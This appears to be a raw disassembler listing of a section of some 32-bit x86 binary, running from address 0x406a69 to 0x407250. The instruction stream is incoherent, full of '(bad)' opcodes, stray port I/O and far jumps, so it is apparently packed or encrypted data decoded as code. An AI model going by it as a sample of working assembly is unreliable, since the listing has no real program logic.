  406a69:	xor    DWORD PTR [edx+edx*4+0x65],edi
  406a6d:	adc    eax,0x1479d279
  406a72:	xchg   esi,eax
  406a73:	shr    DWORD PTR [eiz*8+0x22a80738],cl
  406a7a:	mov    esp,0x2b094e99
  406a7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a80:	xor    DWORD PTR [ebx],esi
  406a82:	xor    eax,0xb583bc2c
  406a87:	or     BYTE PTR [eax+esi*8],ch
  406a8a:	pop    esp
  406a8b:	mul    DWORD PTR [ecx+0x79]
  406a8e:	int    0xc0
  406a90:	jmp    0xcc3506ed
  406a95:	scas   eax,DWORD PTR es:[edi]
  406a96:	inc    ecx
  406a97:	jl     0x406aff
  406a99:	mov    DWORD PTR [ebp-0xf0c7525],ebp
  406a9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406aa0:	push   edx
  406aa1:	xchg   ch,cl
  406aa3:	sbb    dh,BYTE PTR [ecx+0x6c923463]
  406aa9:	inc    ebp
  406aaa:	jmp    0x296d:0xe5c45362
  406ab1:	in     eax,0xa9
  406ab3:	mov    ds:0x435d9364,al
  406ab8:	xor    DWORD PTR [edx],esp
  406aba:	outs   dx,BYTE PTR ds:[esi]
  406abb:	mov    ah,0x82
  406abd:	mov    edx,0x5c1a48a0
  406ac2:	lods   al,BYTE PTR ds:[esi]
  406ac3:	aas    
  406ac4:	pop    esi
  406ac5:	(bad)  
  406ac6:	mov    ah,0x9a
  406ac8:	fidivr DWORD PTR ds:0x7b101f2e
  406ace:	out    dx,al
  406acf:	sbb    eax,0x8b305ad0
  406ad4:	lods   al,BYTE PTR ds:[esi]
  406ad5:	into   
  406ad6:	pushf  
  406ad7:	xchg   edx,eax
  406ad8:	ror    BYTE PTR [ebx-0x5d74b16b],0xf5
  406adf:	push   eax
  406ae0:	and    eax,ebp
  406ae2:	adc    al,0xdc
  406ae4:	les    eax,FWORD PTR [ebx]
  406ae6:	loope  0x406b58
  406ae8:	int3   
  406ae9:	imul   DWORD PTR [ebx+eiz*2]
  406aec:	sti    
  406aed:	arpl   WORD PTR ds:0x339d884e,bp
  406af3:	add    DWORD PTR [ecx-0x23],ebx
  406af6:	inc    esi
  406af7:	jg     0x406af6
  406af9:	cmp    BYTE PTR [ebx],bh
  406afb:	mov    dl,0x6b
  406afd:	add    ebx,DWORD PTR [ecx+ebx*4-0x72]
  406b01:	adc    ch,BYTE PTR [edi+edx*2-0x61e1d9ca]
  406b08:	fsub   DWORD PTR [eax]
  406b0a:	div    al
  406b0c:	mov    al,0x43
  406b0e:	nop
  406b0f:	fidiv  WORD PTR [ebx-0x3]
  406b12:	shr    DWORD PTR [edi-0x34109a2d],1
  406b18:	jo     0x406aad
  406b1a:	es dec eax
  406b1c:	push   eax
  406b1d:	dec    ebp
  406b1e:	test   eax,0x515b1e8
  406b23:	dec    esp
  406b24:	repz or al,0xd0
  406b27:	push   ecx
  406b28:	pop    ecx
  406b29:	or     BYTE PTR [edi+0xc9dc3bd],bl
  406b2f:	pop    esi
  406b30:	mov    dl,0x56
  406b32:	popa   
  406b33:	jp     0x406b5f
  406b35:	xor    bl,bl
  406b37:	retf   
  406b38:	div    DWORD PTR [edi-0x2c]
  406b3b:	call   0x86fa82f6
  406b40:	mov    ch,0x4
  406b42:	in     eax,dx
  406b43:	or     dl,al
  406b45:	add    edx,edi
  406b47:	add    esi,DWORD PTR [edi+0x5391dcca]
  406b4d:	rol    DWORD PTR [edi],1
  406b4f:	test   DWORD PTR [ecx],edi
  406b51:	lahf   
  406b52:	mov    bh,ch
  406b54:	mov    esi,DWORD PTR [eax*8+0x221ff8d]
  406b5b:	repnz repnz dec ebp
  406b5e:	jae    0x406b4e
  406b60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b61:	jg     0x406b63
  406b63:	in     al,0xea
  406b65:	leave  
  406b66:	sub    eax,0x23b0433b
  406b6b:	fisub  DWORD PTR [eax+0x30]
  406b6e:	adc    BYTE PTR [ebx],ah
  406b70:	pop    esp
  406b71:	and    eax,esp
  406b73:	and    bh,cl
  406b75:	cmp    BYTE PTR [ebp+0x4a],0x93
  406b79:	dec    edx
  406b7a:	int3   
  406b7b:	dec    eax
  406b7c:	es pop eax
  406b7e:	mov    cl,0xa2
  406b80:	mov    esp,0x2af4206b
  406b85:	(bad)  
  406b86:	das    
  406b87:	mov    ds:0x967f14e1,eax
  406b8c:	inc    eax
  406b8d:	fcom   st(1)
  406b8f:	xchg   BYTE PTR [ecx+0xf],bh
  406b92:	outs   dx,BYTE PTR fs:[esi]
  406b94:	adc    dl,BYTE PTR [ebp-0xf]
  406b97:	jl     0x406bd2
  406b99:	jmp    0x406b64
  406b9b:	int    0xd
  406b9d:	imul   ecx,DWORD PTR [esi-0x13],0xfffffff5
  406ba1:	sti    
  406ba2:	fsubr  DWORD PTR [esi-0x16]
  406ba5:	cmp    eax,DWORD PTR [edx-0x67]
  406ba8:	leave  
  406ba9:	arpl   si,cx
  406bab:	add    DWORD PTR [ecx+0x4d],0x2bb148b5
  406bb2:	call   0x208a23d5
  406bb7:	dec    esp
  406bb8:	push   edi
  406bb9:	and    eax,0x3a802c4
  406bbe:	fld    QWORD PTR [esi+0x2b8cb79f]
  406bc4:	add    al,0x13
  406bc6:	adc    DWORD PTR [ecx+0x5a],ecx
  406bc9:	mov    ah,0xe6
  406bcb:	fadd   QWORD PTR [eax+0x75951ede]
  406bd2:	ror    BYTE PTR [edi],1
  406bd4:	xchg   ecx,eax
  406bd5:	mov    esp,0x2d52f232
  406bda:	push   ecx
  406bdb:	enter  0x537a,0x6e
  406bdf:	adc    al,0x3f
  406be1:	xlat   BYTE PTR ds:[ebx]
  406be2:	ror    cl,cl
  406be4:	cmp    bh,dl
  406be6:	push   eax
  406be7:	inc    ecx
  406be8:	sbb    ah,BYTE PTR [edx-0x6b789dce]
  406bee:	mov    BYTE PTR [eax+0x76],dh
  406bf1:	adc    esp,DWORD PTR [ebx+0x3bc70212]
  406bf7:	femms  
  406bf9:	cmp    esp,DWORD PTR [edi]
  406bfb:	test   dl,0xaa
  406bfe:	or     edi,edi
  406c00:	gs add eax,0xe3d27604
  406c06:	jge    0x406ba6
  406c08:	sub    esi,eax
  406c0a:	mov    DWORD PTR [edi],edx
  406c0c:	ret    
  406c0d:	jns    0x406c2b
  406c0f:	sbb    al,0x84
  406c11:	aas    
  406c12:	xor    DWORD PTR [ebp+0x32f5753b],0x363987a7
  406c1c:	mov    esi,ss
  406c1e:	add    ebp,DWORD PTR [eax+0x2ed8c3b5]
  406c24:	mov    ah,BYTE PTR [eax-0x52]
  406c27:	adc    DWORD PTR [edi-0x61a8695c],edx
  406c2d:	dec    esp
  406c2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c2f:	in     eax,dx
  406c30:	mov    ecx,0xaee167c0
  406c35:	and    eax,0xcf9a5b8d
  406c3a:	in     al,0x3
  406c3c:	shl    DWORD PTR [edx-0x1ceb9797],0x44
  406c43:	fldenv [esi]
  406c45:	(bad)  
  406c46:	lea    esp,[edx+0x10]
  406c49:	sub    eax,0xb1b2f95c
  406c4e:	outs   dx,DWORD PTR ds:[esi]
  406c4f:	mov    ah,0xa0
  406c51:	push   es
  406c52:	sbb    DWORD PTR [ebx+0x2f],edx
  406c55:	cld    
  406c56:	mov    ah,BYTE PTR [eax]
  406c58:	clc    
  406c59:	cmp    ch,BYTE PTR [ebp-0x1bc55f5d]
  406c5f:	repnz scas al,BYTE PTR es:[edi]
  406c61:	or     BYTE PTR [edi],dh
  406c63:	inc    edi
  406c64:	xchg   DWORD PTR [eax+0x3222d023],esp
  406c6a:	mov    ax,ds:0xc507cbfe
  406c70:	loopne 0x406c9e
  406c72:	outs   dx,BYTE PTR ds:[esi]
  406c73:	out    0xc6,eax
  406c75:	jo     0x406ceb
  406c77:	(bad)  
  406c78:	push   edi
  406c79:	inc    esp
  406c7a:	lahf   
  406c7b:	aas    
  406c7c:	jmp    0x50c7607f
  406c81:	mov    bl,0xf9
  406c83:	test   esi,0xfe5bac85
  406c89:	shr    BYTE PTR [edx],1
  406c8b:	fs mov ch,0x85
  406c8e:	ret    
  406c8f:	out    dx,eax
  406c90:	addr16 in eax,dx
  406c92:	les    edi,FWORD PTR [ebp-0x71722122]
  406c98:	and    bh,al
  406c9a:	rcr    DWORD PTR [eax],0xe1
  406c9d:	call   0xbf33:0xcbda1305
  406ca4:	or     BYTE PTR [ebx],dl
  406ca6:	mov    ebp,0x232a7dfe
  406cab:	aam    0xba
  406cad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cae:	popf   
  406caf:	push   ebx
  406cb0:	ror    ch,cl
  406cb2:	xor    DWORD PTR [esi],esi
  406cb4:	sub    esi,esi
  406cb6:	ror    BYTE PTR [ecx+0x19],cl
  406cb9:	daa    
  406cba:	call   0xe9f6:0x31b0bc3
  406cc1:	xchg   esp,eax
  406cc2:	fadd   DWORD PTR [esi+0x55]
  406cc5:	dec    esi
  406cc6:	ret    
  406cc7:	add    BYTE PTR [edx-0xff1f6ca],dh
  406ccd:	pusha  
  406cce:	xchg   esp,eax
  406ccf:	push   ss
  406cd0:	mov    ecx,0x41125fbc
  406cd5:	in     al,dx
  406cd6:	or     edx,esi
  406cd8:	xchg   esi,eax
  406cd9:	sbb    al,BYTE PTR [esi]
  406cdb:	or     al,0x74
  406cdd:	jae    0x406cea
  406cdf:	mov    eax,0xc3c8b58
  406ce4:	mov    cl,0x16
  406ce6:	xchg   BYTE PTR [ebx+eiz*1+0x3c],bl
  406cea:	arpl   WORD PTR [edx],si
  406cec:	mov    DWORD PTR [esp+esi*4+0x6476c4a],eax
  406cf3:	jo     0x406d01
  406cf5:	add    bh,ch
  406cf7:	xor    al,0xe4
  406cf9:	outs   dx,BYTE PTR ds:[esi]
  406cfa:	jbe    0x406cd3
  406cfc:	das    
  406cfd:	stos   BYTE PTR es:[edi],al
  406cfe:	mov    edx,0xe2ca912f
  406d03:	pop    eax
  406d04:	lds    ecx,FWORD PTR [eax+0x54058a6a]
  406d0a:	cmp    bh,BYTE PTR [esi-0x7428ea17]
  406d10:	cmp    dl,dl
  406d12:	ins    BYTE PTR es:[edi],dx
  406d13:	add    eax,ebp
  406d15:	into   
  406d16:	jl     0x406ccf
  406d18:	icebp  
  406d19:	out    0xc6,al
  406d1b:	xor    ah,BYTE PTR [edi]
  406d1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d1e:	out    0xc3,al
  406d20:	adc    al,0xa3
  406d22:	push   es
  406d23:	dec    ebx
  406d24:	dec    ecx
  406d25:	inc    esi
  406d26:	stos   BYTE PTR es:[edi],al
  406d27:	dec    edi
  406d28:	adc    DWORD PTR [ebx+0x4684b491],0xffffffb7
  406d2f:	jl     0x406da8
  406d31:	push   eax
  406d32:	add    DWORD PTR ds:0x88f58e47,ebx
  406d38:	ins    DWORD PTR es:[edi],dx
  406d39:	pop    edx
  406d3a:	loope  0x406d30
  406d3c:	lds    ebp,FWORD PTR [eax-0x4d]
  406d3f:	pushf  
  406d40:	cdq    
  406d41:	fldcw  WORD PTR [esi+0x51]
  406d44:	fdivr  DWORD PTR [edi+0x3d]
  406d47:	lea    edx,[esi+ecx*8+0x11]
  406d4b:	(bad)  
  406d4c:	shl    eax,cl
  406d4e:	mov    edx,0x5a0b855c
  406d53:	inc    edx
  406d54:	clc    
  406d55:	sbb    eax,0xf95fbcbd
  406d5a:	pop    edx
  406d5b:	xor    DWORD PTR [ecx+ecx*1-0xb],esi
  406d5f:	stc    
  406d60:	jp     0x406d5d
  406d62:	inc    eax
  406d63:	jecxz  0x406d2d
  406d65:	add    cl,bl
  406d67:	inc    esp
  406d68:	ret    0x6e8f
  406d6b:	stos   BYTE PTR es:[edi],al
  406d6c:	mov    eax,0x764ee06c
  406d71:	inc    ecx
  406d72:	cmp    BYTE PTR [esi-0x51],ah
  406d75:	je     0x406dce
  406d77:	add    BYTE PTR [ecx],dh
  406d79:	xor    dl,BYTE PTR [ebp+0x3f]
  406d7c:	jl     0x406d6d
  406d7e:	or     DWORD PTR [ebx],edx
  406d80:	sbb    al,0x86
  406d82:	(bad)  
  406d83:	maxps  xmm2,xmm4
  406d86:	outs   dx,DWORD PTR ds:[esi]
  406d87:	push   ecx
  406d88:	sbb    edx,0x8dbbef54
  406d8e:	sub    DWORD PTR [edi+0x79],0xffffff89
  406d92:	add    esi,DWORD PTR [edi]
  406d94:	pop    esp
  406d95:	sahf   
  406d96:	push   esp
  406d97:	pop    eax
  406d98:	daa    
  406d99:	jp     0x406d9b
  406d9b:	inc    ebp
  406d9c:	mov    cl,0xa5
  406d9e:	fldcw  WORD PTR [edi]
  406da0:	pushf  
  406da1:	mov    ds:0xd3aa1f60,al
  406da6:	and    ecx,ebx
  406da8:	push   0xffffffea
  406daa:	cmc    
  406dab:	(bad)  
  406dac:	fisttp WORD PTR ds:0x91971701
  406db2:	add    ch,bl
  406db4:	push   ecx
  406db5:	add    esp,DWORD PTR [edx+0x27]
  406db8:	mov    al,0xc4
  406dba:	mov    al,ds:0x3e56e305
  406dbf:	arpl   WORD PTR [ecx+0x1e40156],cx
  406dc5:	mov    ecx,ecx
  406dc7:	sbb    eax,0x1ab8689e
  406dcc:	xor    DWORD PTR [ecx-0xb49b3dc],ebx
  406dd2:	mov    cl,bh
  406dd4:	repnz xchg ecx,eax
  406dd6:	mov    ds:0x86704251,al
  406ddb:	and    al,0x6a
  406ddd:	int    0x1
  406ddf:	js     0x406dab
  406de1:	nop
  406de2:	cmp    edx,DWORD PTR [eax]
  406de4:	ins    DWORD PTR es:[edi],dx
  406de5:	push   0x9b9a169b
  406dea:	repz aam 0xec
  406ded:	or     ch,dl
  406def:	(bad)  
  406df0:	jns    0x406e46
  406df2:	call   0xb047:0xacb22bfc
  406df9:	loop   0x406dcc
  406dfb:	dec    ebx
  406dfc:	inc    ebp
  406dfd:	jne    0x406e62
  406dff:	pop    edi
  406e00:	punpckhbw mm4,mm3
  406e03:	sahf   
  406e04:	add    dl,al
  406e06:	or     al,0xe6
  406e08:	pop    ebx
  406e09:	add    dl,dh
  406e0b:	fwait
  406e0c:	cmp    ebp,DWORD PTR [ecx+edi*2-0x10325467]
  406e13:	jmp    0x1130:0xfd0fb99b
  406e1a:	xchg   esi,eax
  406e1b:	xor    DWORD PTR ds:0x4fa200c3,esp
  406e21:	popa   
  406e22:	es (bad) 
  406e24:	std    
  406e25:	jmp    0xbb97d816
  406e2a:	(bad)  
  406e2b:	cld    
  406e2c:	sub    al,0x38
  406e2e:	jge    0x406e99
  406e30:	mov    cl,0x6f
  406e32:	or     bl,BYTE PTR [esp+edi*4]
  406e35:	(bad)  
  406e36:	fist   DWORD PTR [ebx+ecx*1+0x4e]
  406e3a:	pop    eax
  406e3b:	pop    edx
  406e3c:	adc    eax,0xb3845ea8
  406e41:	retf   0xb59f
  406e44:	cld    
  406e45:	inc    esp
  406e46:	inc    esi
  406e47:	dec    ebx
  406e48:	mov    dl,0x95
  406e4a:	test   BYTE PTR [edi+ebp*2+0x6f],bl
  406e4e:	in     eax,dx
  406e4f:	retf   0x8565
  406e52:	call   0x2137:0x86351722
  406e59:	mov    eax,0xbd6e57c3
  406e5e:	jae    0x406e21
  406e60:	sub    bh,bh
  406e62:	retf   
  406e63:	enter  0x5fd8,0x64
  406e67:	sahf   
  406e68:	das    
  406e69:	or     DWORD PTR [eax-0x46d3dd2f],esi
  406e6f:	adc    eax,0xd30b7edc
  406e74:	jno    0x406eb1
  406e76:	(bad)  
  406e78:	imul   esp,DWORD PTR [ecx],0x1c
  406e7b:	popf   
  406e7c:	inc    ebp
  406e7d:	pop    edi
  406e7e:	push   eax
  406e7f:	dec    ecx
  406e80:	jno    0x406e35
  406e82:	adc    eax,DWORD PTR [ebx-0x48]
  406e85:	push   ebp
  406e86:	fcomi  st,st(5)
  406e88:	adc    al,0xf9
  406e8a:	cmp    al,0xb9
  406e8c:	sti    
  406e8d:	mov    esi,0x66d977e
  406e92:	repz mov ch,0x1e
  406e95:	ret    
  406e96:	shl    BYTE PTR [eax+0x6a473cdf],1
  406e9c:	inc    DWORD PTR [esi]
  406e9e:	fidivr DWORD PTR [edx-0x1b5fa1af]
  406ea4:	(bad)  
  406ea5:	and    eax,0xc1df7a37
  406eaa:	xor    dl,dl
  406eac:	(bad)  
  406eae:	add    BYTE PTR [esi-0x6],ah
  406eb1:	stos   DWORD PTR es:[edi],eax
  406eb2:	mov    al,ds:0xea89d31a
  406eb7:	mov    dl,0xb0
  406eb9:	pop    es
  406eba:	xchg   ebp,eax
  406ebb:	sub    eax,0xa4c9222f
  406ec0:	pop    ebp
  406ec1:	ins    DWORD PTR es:[edi],dx
  406ec2:	(bad)  
  406ec3:	ffreep st(2)
  406ec5:	mov    ecx,edi
  406ec7:	xchg   edx,eax
  406ec8:	sub    al,0xca
  406eca:	xor    ah,al
  406ecc:	inc    esi
  406ecd:	faddp  st(1),st
  406ecf:	out    dx,eax
  406ed0:	mov    ds:0x90606b3f,eax
  406ed5:	stos   BYTE PTR es:[edi],al
  406ed6:	push   ss
  406ed7:	into   
  406ed8:	add    eax,0xee1570f3
  406edd:	cld    
  406ede:	mov    al,0x91
  406ee0:	and    eax,0x6752c4c3
  406ee5:	sbb    ah,bl
  406ee7:	mov    ch,0x14
  406ee9:	jmp    0x727c3e8d
  406eee:	int    0x75
  406ef0:	mov    ecx,0x2e69de40
  406ef5:	mov    esi,0x632d9c30
  406efa:	dec    ebp
  406efb:	lock jnp 0x406f76
  406efe:	loopne 0x406ea5
  406f00:	or     bl,BYTE PTR [edx+0x40]
  406f03:	stc    
  406f04:	sbb    DWORD PTR [ecx],eax
  406f06:	mov    bh,0xd6
  406f08:	push   edi
  406f09:	inc    esp
  406f0a:	sbb    ebx,edx
  406f0c:	mov    fs,WORD PTR [ecx-0x1a]
  406f0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f11:	push   esi
  406f12:	dec    ebx
  406f13:	je     0x406ec6
  406f15:	add    ecx,esp
  406f17:	sub    edi,DWORD PTR [ecx-0x12]
  406f1a:	icebp  
  406f1b:	push   0x9fcdac42
  406f20:	sbb    DWORD PTR [esi+eiz*1-0x4b3fcdb1],esi
  406f27:	clc    
  406f28:	int    0x34
  406f2a:	mov    ch,0xe9
  406f2c:	pop    ss
  406f2d:	fld    QWORD PTR [edi-0x4c54b882]
  406f33:	xor    esi,DWORD PTR [ecx+ebp*4]
  406f36:	ins    BYTE PTR es:[edi],dx
  406f37:	xor    dl,BYTE PTR [ecx-0x2a119274]
  406f3d:	mov    eax,DWORD PTR [edx]
  406f3f:	loope  0x406f8b
  406f41:	rcl    ecx,cl
  406f43:	aaa    
  406f44:	in     eax,dx
  406f45:	pop    ebx
  406f46:	or     eax,0xa420fa5c
  406f4b:	add    dh,bh
  406f4d:	popa   
  406f4e:	and    DWORD PTR [ecx-0x36],ebp
  406f51:	ins    BYTE PTR es:[edi],dx
  406f52:	inc    edx
  406f53:	jge    0x406fc0
  406f55:	fsqrt  
  406f58:	test   eax,0x1f2cc10f
  406f5d:	call   0xcb30:0xf7823011
  406f64:	mov    ds:0x16c7f405,al
  406f69:	fisttp QWORD PTR [ebx+0x7d]
  406f6c:	loop   0x406f9a
  406f6e:	or     BYTE PTR [edi-0x6b37a52c],al
  406f74:	nop
  406f75:	enter  0x8b86,0x9d
  406f79:	iret   
  406f7a:	xchg   ebp,eax
  406f7b:	mov    cs,WORD PTR [ecx+0x5ba43e42]
  406f81:	fs dec esi
  406f83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f84:	ja     0x406f30
  406f86:	not    DWORD PTR [edx+0x79d92ea2]
  406f8c:	dec    ebx
  406f8d:	stos   BYTE PTR es:[edi],al
  406f8e:	(bad)  
  406f8f:	jl     0x406f8b
  406f91:	push   edi
  406f92:	iret   
  406f93:	jge    0x406fcb
  406f95:	xchg   edx,eax
  406f96:	popf   
  406f97:	mov    edi,DWORD PTR [edx-0x675e58c6]
  406f9d:	test   BYTE PTR [eax-0x49],dh
  406fa0:	fld    QWORD PTR [esi]
  406fa2:	mul    BYTE PTR [esi+0x74d674fd]
  406fa8:	scas   al,BYTE PTR es:[edi]
  406fa9:	push   esi
  406faa:	fld    TBYTE PTR [ecx+0x4e]
  406fad:	dec    edx
  406fae:	xor    ah,BYTE PTR [esi]
  406fb0:	ins    BYTE PTR es:[edi],dx
  406fb1:	jb     0x40701d
  406fb3:	or     bh,BYTE PTR [eax+0x4c723dd7]
  406fb9:	or     al,0x27
  406fbb:	call   0xcce0e96e
  406fc0:	jae    0x406f5d
  406fc2:	push   edx
  406fc3:	shl    esi,cl
  406fc5:	pop    ebx
  406fc6:	sub    al,0x3e
  406fc8:	mov    bl,0xc
  406fca:	push   esi
  406fcb:	call   0x3b1dd318
  406fd0:	jno    0x406f69
  406fd2:	test   eax,0xdffebd7b
  406fd7:	imul   BYTE PTR [edi*2+0x31412c97]
  406fde:	mov    eax,ds:0xe84c3099
  406fe3:	pushf  
  406fe4:	leave  
  406fe5:	sti    
  406fe6:	(bad)  
  406fe7:	jle    0x406f9a
  406fe9:	inc    BYTE PTR [ecx*8+0x5250d28]
  406ff0:	pop    ebx
  406ff1:	cdq    
  406ff2:	out    0xee,al
  406ff4:	or     ah,dl
  406ff6:	out    0xcd,eax
  406ff8:	or     DWORD PTR [edi],edx
  406ffa:	ror    DWORD PTR [ebp-0xe4b37e0],1
  407000:	smsw   WORD PTR [ebx+0x3ed9bfc1]
  407007:	out    0x88,al
  407009:	push   ecx
  40700a:	mov    ebp,0xa8def3df
  40700f:	jb     0x406f9d
  407011:	data16 sub cl,bh
  407014:	adc    al,0xb8
  407016:	jb     0x406fc0
  407018:	rcr    esp,cl
  40701a:	jo     0x406fb6
  40701c:	pushf  
  40701d:	jns    0x407038
  40701f:	sbb    al,0x1
  407021:	cmp    eax,0x6c78f916
  407026:	push   ds
  407027:	add    ebx,DWORD PTR [ebx+0x2081f972]
  40702d:	popa   
  40702e:	popa   
  40702f:	ds cld 
  407031:	jns    0x406fc6
  407033:	cli    
  407034:	jo     0x407087
  407036:	nop
  407037:	ja     0x407032
  407039:	dec    edx
  40703a:	push   edi
  40703b:	aad    0x4b
  40703d:	jnp    0x406fed
  40703f:	and    esp,edx
  407041:	mov    ebx,fs
  407043:	rol    BYTE PTR [eax],0xf9
  407046:	and    bh,BYTE PTR [edi-0x49]
  407049:	adc    DWORD PTR [ebp+0x7da80020],ebp
  40704f:	cmp    al,0x8e
  407051:	mov    fs,WORD PTR [ebp-0x6c]
  407054:	fwait
  407055:	scas   eax,DWORD PTR es:[edi]
  407056:	mov    ah,0x52
  407058:	mov    eax,0x3e666efb
  40705d:	(bad)  
  40705f:	loop   0x40701b
  407061:	or     ecx,ebx
  407063:	sub    BYTE PTR [esi],ch
  407065:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407066:	call   0x489f2626
  40706b:	sahf   
  40706c:	cli    
  40706d:	sbb    eax,0x56a08d7d
  407072:	push   ebp
  407073:	pop    ebx
  407074:	cdq    
  407075:	pop    edi
  407076:	pushf  
  407077:	sti    
  407078:	mov    edi,0xa3b3b3bb
  40707d:	xor    DWORD PTR [edx+eax*4+0x23],edi
  407081:	mov    dh,BYTE PTR [edx+0x2f82d37]
  407087:	adc    eax,0x1341ccf3
  40708c:	out    dx,eax
  40708d:	out    dx,eax
  40708e:	leave  
  40708f:	out    0xe,al
  407091:	or     esp,DWORD PTR [ebx-0x36]
  407094:	mov    edx,eax
  407096:	and    BYTE PTR [ebx+0x380cf38d],cl
  40709c:	in     al,dx
  40709d:	mov    eax,0xec1a1c92
  4070a2:	xchg   ebp,eax
  4070a3:	aad    0xba
  4070a5:	lods   eax,DWORD PTR ds:[esi]
  4070a6:	push   ebp
  4070a7:	push   edx
  4070a8:	push   0x2f9171a
  4070ad:	or     eax,0xd437f8d6
  4070b2:	pop    ebx
  4070b3:	mov    eax,0x74396c4b
  4070b8:	xor    dh,bl
  4070ba:	mov    esi,0xe6bd57da
  4070bf:	xchg   esi,eax
  4070c0:	sbb    dh,BYTE PTR [ebp-0x143c0ef1]
  4070c6:	dec    edx
  4070c7:	fisubr DWORD PTR ds:0x17371e2b
  4070cd:	jp     0x40710c
  4070cf:	div    DWORD PTR [ebx+0x1f]
  4070d2:	(bad)  
  4070d4:	sbb    DWORD PTR [edi],eax
  4070d6:	dec    eax
  4070d7:	jp     0x4070fd
  4070d9:	push   ecx
  4070da:	cmc    
  4070db:	xor    eax,0xb74b9e75
  4070e0:	or     DWORD PTR [ebx-0x42],ebp
  4070e3:	jo     0x407111
  4070e5:	xor    al,0xcb
  4070e7:	jecxz  0x407074
  4070e9:	or     BYTE PTR [edi+0x25],ch
  4070ec:	cmp    al,0x47
  4070ee:	jns    0x4070ce
  4070f0:	ins    DWORD PTR es:[edi],dx
  4070f1:	xchg   ebp,eax
  4070f2:	std    
  4070f3:	rcl    BYTE PTR [eax-0x730a09a8],0x25
  4070fa:	pop    esi
  4070fb:	xor    esp,eax
  4070fd:	or     eax,0xb4ff904e
  407102:	push   0xffffffa3
  407104:	sbb    eax,0xca3704a0
  407109:	mov    eax,0xe297d7d1
  40710e:	adc    DWORD PTR [edi-0x28],0xe9564ec8
  407115:	cmp    DWORD PTR [edx+edi*8],esp
  407118:	stc    
  407119:	mov    ch,bh
  40711b:	mov    ebp,0x1bc1065a
  407120:	ret    
  407121:	fimul  DWORD PTR [esi-0x207bd232]
  407127:	lea    eax,[esi]
  407129:	jmp    0x4070c4
  40712b:	loopne 0x40710e
  40712d:	(bad)  
  40712e:	mov    eax,0x14a71b16
  407133:	push   0x70
  407135:	push   ebx
  407136:	loop   0x407163
  407138:	addr16 clc 
  40713a:	std    
  40713b:	sbb    al,0x57
  40713e:	xchg   esi,eax
  40713f:	shl    BYTE PTR [esi-0x1f06177d],0x13
  407146:	dec    eax
  407147:	scas   eax,DWORD PTR es:[edi]
  407148:	pusha  
  407149:	ret    
  40714a:	mov    al,ds:0xf324c8f8
  40714f:	enter  0x11,0x99
  407153:	ret    0x6c38
  407156:	les    ebp,FWORD PTR [esi-0x46]
  407159:	fsubrp st(2),st
  40715b:	cdq    
  40715c:	(bad)  
  40715d:	cmp    eax,0x205026a8
  407162:	jae    0x40713d
  407164:	mov    cl,0xe6
  407166:	push   0x3c035be0
  40716b:	jae    0x407116
  40716d:	xor    dh,BYTE PTR [edi]
  40716f:	mov    al,0xa
  407171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407172:	test   al,0x3
  407174:	lea    eax,[ebx+edx*4+0x6d]
  407178:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407179:	ror    BYTE PTR [edi],1
  40717b:	mov    ?,eax
  40717d:	jge    0x4071dc
  40717f:	xlat   BYTE PTR ds:[ebx]
  407180:	(bad)  
  407181:	and    eax,0x91b3079d
  407186:	pop    ss
  407187:	(bad)  
  407188:	mov    ebp,0x87ea2087
  40718d:	add    DWORD PTR [edx+edx*2],ebx
  407190:	enter  0xebbe,0x89
  407194:	sahf   
  407195:	fidiv  WORD PTR [esi-0x5]
  407198:	rcr    DWORD PTR [ebp+0x59],cl
  40719b:	bswap  edx
  40719d:	clc    
  40719e:	and    DWORD PTR gs:[eax+0x4],eax
  4071a2:	ret    0x1d59
  4071a5:	cs mov eax,0xc3a2ab33
  4071ab:	push   es
  4071ac:	sub    BYTE PTR [ecx+ecx*8+0x7d291df2],al
  4071b3:	cli    
  4071b4:	daa    
  4071b5:	inc    BYTE PTR [edx+0x221a3694]
  4071bb:	cs add edx,edi
  4071be:	ins    DWORD PTR es:[edi],dx
  4071bf:	jmp    0xac11:0x4a4392d1
  4071c6:	adc    DWORD PTR ds:0xd7559214,ebx
  4071cc:	leave  
  4071cd:	xor    eax,0x2108673c
  4071d2:	push   ds
  4071d3:	adc    dl,BYTE PTR [edi]
  4071d5:	ins    DWORD PTR es:[edi],dx
  4071d6:	xchg   ah,dh
  4071d8:	pushf  
  4071d9:	xchg   DWORD PTR [edi],edi
  4071db:	mov    ebp,0x37ae5b17
  4071e0:	les    ebp,FWORD PTR [ebp+0x4e]
  4071e3:	jae    0x407254
  4071e5:	xor    DWORD PTR [edi+0x5099c4b5],edx
  4071eb:	jmp    0xabe1b37e
  4071f0:	cs or  eax,0x168bcb88
  4071f6:	xchg   ebp,eax
  4071f7:	pop    ebp
  4071f8:	jecxz  0x407185
  4071fa:	pop    eax
  4071fb:	jl     0x407200
  4071fd:	imul   ebp,DWORD PTR [ebx+0x45e9892f],0x4
  407204:	test   ah,bh
  407206:	sub    edx,DWORD PTR [ebp+0x39e58861]
  40720c:	in     eax,dx
  40720d:	push   0xffffffff
  40720f:	mov    edx,esp
  407211:	ins    BYTE PTR es:[edi],dx
  407212:	jnp    0x40726e
  407214:	pop    ds
  407215:	sub    BYTE PTR [ecx],ch
  407217:	jecxz  0x407234
  407219:	and    ecx,0x53
  40721c:	xchg   ebp,eax
  40721d:	mov    eax,0xdfc21634
  407222:	jb     0x4071a9
  407224:	(bad)  
  407225:	gs call 0xeaeb2c62
  40722b:	test   eax,0x8a8d0bf2
  407230:	mov    ah,0xda
  407232:	imul   esi,DWORD PTR ds:0x9306c3bc,0xffffffb6
  407239:	popa   
  40723a:	add    al,0xde
  40723c:	inc    edi
  40723d:	mov    esi,DWORD PTR [ecx-0x416dd209]
  407243:	pop    es
  407244:	and    DWORD PTR [esi],0xcbd5106c
  40724a:	push   esp
  40724b:	(bad)  
  40724c:	xor    al,BYTE PTR [edi+0xe]
  40724f:	lods   eax,DWORD PTR ds:[esi]
  407250:	cmp    ecx,ecx
